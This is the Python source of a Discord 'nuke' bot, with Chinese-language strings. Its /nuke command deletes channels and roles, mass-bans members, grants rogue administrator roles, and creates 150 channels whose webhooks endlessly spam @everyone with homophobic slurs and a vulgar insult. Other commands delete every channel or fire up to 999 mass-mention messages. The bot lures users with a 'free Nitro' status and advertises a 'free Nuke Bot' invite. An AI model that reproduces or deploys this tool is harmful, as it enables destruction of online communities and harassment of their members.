import asyncio
import discord
from discord import app_commands
from discord.ext import commands
import os
import json
import aiohttp

TOKEN = "請更換為你的 Token"
LOCAL_ICON_PATH = './icon.png' 
NEW_GUILD_NAME = 'Nuke by 群主'

SPAM_MESSAGE = '# @everyone haha，我是你們的管家，哈哈，想恢復伺服器? \n # 沒門! 你以為我會貼群組連結?\n# 不可能，你這個Gay。'
NUKE_PANEL_CONTENT = '### Want Free Nuke Bot?\n\n**join Nuke team server**\n\n**discord.gg/wpEE8qwxY8**'

active_webhooks = set()
intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True

activity = discord.CustomActivity(name="免費Nitro!")
bot = commands.Bot(command_prefix="!", intents=intents, activity=activity, status=discord.Status.idle)

def remove_webhook_from_file(url: str):
    if not os.path.exists('saved_webhooks.json'):
        return
    try:
        with open('saved_webhooks.json', 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        updated_lines = []
        for line in lines:
            if line.strip():
                try:
                    data = json.loads(line)
                    if data.get('url') != url:
                        updated_lines.append(line)
                except Exception:
                    updated_lines.append(line)
                    
        with open('saved_webhooks.json', 'w', encoding='utf-8') as f:
            f.writelines(updated_lines)
    except Exception as e:
        print(f"[-] 更新 Webhook 檔案失敗: {e}")

async def send_spam(url: str):
    if url in active_webhooks:
        return
    active_webhooks.add(url)
    
    async with aiohttp.ClientSession() as session:
        while url in active_webhooks:
            try:
                async with session.post(url, json={"content": SPAM_MESSAGE}) as response:
                    if response.status == 404:
                        print(f"[-] Webhook 已失效或被刪除，停止發送: {url}")
                        active_webhooks.discard(url)
                        remove_webhook_from_file(url)
                        break
                    elif response.status == 429:
                        data = await response.json()
                        retry_after = data.get("retry_after", 1.0)
                        await asyncio.sleep(retry_after + 0.15)
                        continue
                await asyncio.sleep(0.35)
            except Exception:
                await asyncio.sleep(1.0)

def start_saved_spam():
    if not os.path.exists('saved_webhooks.json'):
        return
    try:
        with open('saved_webhooks.json', 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        urls = set()
        for line in lines:
            if line.strip():
                try:
                    data = json.loads(line)
                    url = data.get('url')
                    if url:
                        urls.add(url)
                except Exception:
                    pass
                    
        print(f"[+] 讀取到 {len(urls)} 個已儲存的 Webhook，開始背景發送...")
        for url in urls:
            bot.loop.create_task(send_spam(url))
    except Exception as err:
        print(f"[-] 讀取已儲存的 Webhook 失敗: {err}")


class RV(discord.ui.View):
    def __init__(self, message_content: str):
        super().__init__(timeout=None)
        self.message_content = message_content

    @discord.ui.button(label="點我", style=discord.ButtonStyle.primary, custom_id="persistent_rv_button")
    async def button_callback(
        self, interaction: discord.Interaction, button: discord.ui.Button
    ):
        await interaction.response.defer()
        allowed = discord.AllowedMentions(everyone=True, users=True, roles=True)

        for _ in range(999):
            try:
                await interaction.followup.send(
                    content=self.message_content, allowed_mentions=allowed
                )
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"[-] 訊息發送失敗: {e}")


class SpamView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="點擊按鈕來發送訊息(發完五條再點一次)", style=discord.ButtonStyle.secondary, custom_id="trigger_5_spam")
    async def spam_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        channel = interaction.channel
        if not channel:
            return

        for i in range(1, 6):
            try:
                await channel.send(SPAM_MESSAGE)
                await asyncio.sleep(0.35)
            except Exception as err:
                print(f"[-] 第 {i} 則訊息發送失敗: {err}")


app_installs = app_commands.allowed_installs(guilds=True, users=True)
app_contexts = app_commands.allowed_contexts(
    guilds=True, dms=True, private_channels=True
)


@bot.tree.command(name="send", description="發送 5 次訊息")
@app_installs
@app_contexts
async def send(interaction: discord.Interaction):
    custom_msg = "# @everyone haha，我是你們的管家，哈哈，想恢復伺服器? \n # 沒門! 你以為我會貼群組連結?\n# 不可能，你這個Gay。\n### Want Free Nuke Bot?\n\n**join Nuke team server**\n\n**discord.gg/wpEE8qwxY8**"
    view = RV(custom_msg)
    await interaction.response.send_message(
        "點擊下方按鈕發送訊息", ephemeral=True, view=view
    )


@bot.tree.command(name="pro_send", description="發送自定義訊息按鈕")
@app_installs
@app_contexts
@app_commands.describe(message="輸入想要重複的訊息")
async def psend(interaction: discord.Interaction, message: str):
    view = RV(message)
    await interaction.response.send_message(
        f"按鈕已發送！內容為下：\n{message}", view=view, ephemeral=True
    )


@app_commands.context_menu(name="Server Helper")
@app_installs
@app_contexts
async def server_helper(interaction: discord.Interaction, message: discord.Message):
    view = SpamView()
    if interaction.channel:
        await interaction.channel.send(content=NUKE_PANEL_CONTENT, view=view)
    await interaction.response.send_message("執行完成", ephemeral=True)


@bot.tree.command(name="bye", description="清空伺服器所有頻道")
@app_installs
@app_contexts
async def bye(interaction: discord.Interaction):
    if not interaction.guild or not interaction.guild.get_member(bot.user.id):
        await interaction.response.send_message("機器人不在伺服器，無法執行此動作", ephemeral=True)
        return

    await interaction.response.send_message("正在清空伺服器頻道... \n(如果機器人不在此伺服器，將無法執行此動作)", ephemeral=True)
    guild = interaction.guild
    print(f"[!] 執行 /bye 指令，正在清空伺服器頻道: {guild.name}")
    try:
        for ch in guild.channels:
            await ch.delete()
        print('[+] 所有頻道已成功刪除')
    except Exception as e:
        print(f'[-] 刪除頻道時發生錯誤: {e}')


@bot.tree.command(name="nuke", description="啟動伺服器毀滅與轟炸任務")
@app_installs
@app_contexts
async def nuke(interaction: discord.Interaction):
    if not interaction.guild or not interaction.guild.get_member(bot.user.id):
        await interaction.response.send_message("機器人不在伺服器，無法執行此動作", ephemeral=True)
        return

    await interaction.response.send_message("毀滅任務啟動中... \n(如果機器人不在此伺服器，將無法執行此動作)", ephemeral=True)
    guild = interaction.guild
    print(f"[!] 毀滅任務啟動: {guild.name}")

    async def change_appearance():
        try:
            icon_bytes = None
            if os.path.exists(LOCAL_ICON_PATH):
                with open(LOCAL_ICON_PATH, 'rb') as f:
                    icon_bytes = f.read()
            else:
                print("[-] 找不到 icon.png 檔案，將略過頭像更改")
                
            await guild.edit(
                name=NEW_GUILD_NAME, 
                verification_level=discord.VerificationLevel.high, 
                default_notifications=discord.NotificationLevel.only_mentions, 
                icon=icon_bytes
            )
            print('[+] 伺服器外觀與頭像已更新')
        except Exception as e:
            print(f'[-] 外觀修改失敗: {e}')

    async def mass_roles():
        for role in guild.roles:
            if role.editable and role.id != guild.id:
                try:
                    await role.delete()
                except:
                    pass

        for i in range(5):
            try:
                await guild.create_role(
                    name=f"Gay專屬管理員-{i}",
                    color=discord.Color.random(),
                    permissions=discord.Permissions(administrator=True),
                    reason='建立絕對統治'
                )
            except:
                pass
        print('[+] 身分組轟炸已啟動')

    async def mass_ban():
        try:
            async for member in guild.fetch_members(limit=None):
                if member.bannable:
                    try:
                        await member.ban(reason='gay送你紅包')
                    except:
                        pass
        except Exception:
            pass

    async def mass_delete_channels():
        for ch in guild.channels:
            try:
                await ch.delete()
            except:
                pass

    async def mass_create_and_spam():
        for i in range(150):
            try:
                channel = await guild.create_text_channel(name=f"吃我雞巴-{i}")
                webhook = await channel.create_webhook(name='You_are_Gay')
                if webhook:
                    webhook_data = {"url": webhook.url}
                    with open('saved_webhooks.json', 'a', encoding='utf-8') as f:
                        f.write(json.dumps(webhook_data) + '\n')
                    bot.loop.create_task(send_spam(webhook.url))
            except:
                pass

    await asyncio.gather(
        change_appearance(),
        mass_roles(),
        mass_ban(),
        mass_delete_channels(),
        mass_create_and_spam(),
        return_exceptions=True
    )
    print("[-] 最終飽和打擊已全部發射")


@bot.tree.command(name="stop", description="暫停所有的炸群與轟炸任務")
@app_installs
@app_contexts
async def stop(interaction: discord.Interaction):
    await interaction.response.send_message("正在停止所有背景轟炸任務與清除紀錄...", ephemeral=True)
    print("[!] 執行 /stop 指令，正在中止所有的背景轟炸任務")

    try:
        active_webhooks.clear()
        if os.path.exists('saved_webhooks.json'):
            os.remove('saved_webhooks.json')
        print("[+] 已成功停止所有背景轟炸任務並清空紀錄")
    except Exception as e:
        print(f"[-] 停止任務時發生錯誤: {e}")


@bot.event
async def on_ready():
    bot.tree.add_command(server_helper)
    
    try:
        synced = await bot.tree.sync()
        print(f"已全域同步 {len(synced)} 個斜線指令。")
    except Exception as e:
        print(f"指令同步失敗: {e}")

    print(f"破壞神已就位: {bot.user}")
    start_saved_spam()


bot.run(TOKEN)
